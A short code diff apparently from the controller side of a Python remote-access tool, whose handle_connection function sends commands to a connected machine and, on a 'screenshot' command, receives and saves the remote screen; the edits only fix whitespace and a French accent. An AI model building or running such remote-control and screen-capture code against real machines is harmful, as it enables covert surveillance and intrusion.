@@ -33,7 +33,7 @@ def handle_connection(connection, address):
                 print(f"Output:\n{response}")
 
             connection.send(command.encode())
-            
+
             if command.lower() == 'screenshot':
                 img_size = int(connection.recv(1024).decode())
                 connection.send(b'OK')
@@ -46,7 +46,7 @@ def handle_connection(connection, address):
 
                 with open("screen.png", "wb") as f:
                     f.write(img_data)
-                print("Capture reussie !")
+                print("Capture réussie !")
                 continue
 
         except Exception as e:
